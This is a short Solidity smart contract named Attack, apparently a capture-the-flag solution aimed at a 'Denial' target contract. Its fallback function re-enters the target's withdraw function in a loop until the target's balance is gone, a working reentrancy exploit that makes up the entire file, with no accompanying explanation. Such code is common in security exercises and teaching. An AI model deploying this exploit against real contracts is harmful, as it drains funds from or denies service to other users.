// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Target.sol";

contract Attack {
    Denial public target;
    address irrelevant;
    address payable public owner;
    uint storedTime;

    constructor(address target_addr) {
        target = Denial(payable(target_addr));
        owner = payable(msg.sender);
    }

    function  attack () public
    {
        target.withdraw();
    }

    fallback() external payable
    {
        while (address(target).balance > 0)
        {
            target.withdraw();
        }
    }
}
